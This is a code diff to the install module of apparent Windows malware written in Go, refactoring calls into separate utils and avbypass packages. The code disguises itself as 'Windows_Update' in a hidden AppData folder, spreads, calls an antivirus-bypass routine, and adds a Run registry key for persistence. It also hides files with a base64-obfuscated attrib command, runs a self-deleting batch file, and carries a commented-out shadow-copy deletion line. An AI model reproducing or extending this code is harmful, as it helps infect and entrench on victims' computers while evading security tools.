@@ -3,38 +3,41 @@ package install
 import (
 	"encoding/base64"
 	"os"
-
+	"../utils"
 	cp "github.com/cleversoap/go-cp"
+	"../avbypass"
 )
 
-func Install() {
+var TARGET_FILE_NAME = utils.TARGET_FILE_NAME
+func Install(tfn string) {
+	TARGET_FILE_NAME = tfn
 	// Checks if not running in home folder
-	parent := GetParentFolder()
-	if parent != "Windows_Update" && GetExeName() != TARGET_FILE_NAME {
-		Run("mkdir %APPDATA%\\Windows_Update")
-		Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f")
+	parent := utils.GetParentFolder()
+	if parent != "Windows_Update" && utils.GetExeName() != TARGET_FILE_NAME {
+		utils.Run("mkdir %APPDATA%\\Windows_Update")
+		utils.Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f")
 		os.Remove(os.Getenv("APPDATA") + "\\Windows_Update\\" + TARGET_FILE_NAME)
 		err := cp.Copy(GetExeName(), os.Getenv("APPDATA")+"\\Windows_Update\\"+TARGET_FILE_NAME)
 		Spread()
 		if err == nil {
-			Run("attrib +H +S %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
-			Run("start " + os.Getenv("APPDATA") + "\\Windows_Update\\" + TARGET_FILE_NAME)
+			utils.Run("attrib +H +S %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
+			utils.Run("start " + os.Getenv("APPDATA") + "\\Windows_Update\\" + TARGET_FILE_NAME)
 			os.Exit(0)
 		}
 	}
-	BypassAV()
+	avbypass.BypassAV()
 	//REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\
-	Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
+	utils.Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
 	//attrib +H +S %APPDATA%\\Windows_Update\\
-	Run(Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)
+	utils.Run(Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)
 
 	// TODO: Run with admin
 	//Run("vssadmin.exe Delete Shadows /All /Quiet") //admin
 
 }
 func Uninstall() {
-	Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
-	Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f & del %APPDATA%\\Windows_Update /Q /F")
+	utils.Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
+	utils.Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f & del %APPDATA%\\Windows_Update /Q /F")
 }
 
 func PersistenceBat() {
@@ -49,6 +52,6 @@ func PersistenceBat() {
 	PERSIST.WriteString(string(DecodedRegAdd))
 
 	PERSIST.Close()
-	Run("cmd /C PERSIST.bat")
-	Run("cmd /C del PERSIST.bat")
+	utils.Run("cmd /C PERSIST.bat")
+	utils.Run("cmd /C del PERSIST.bat")
 }
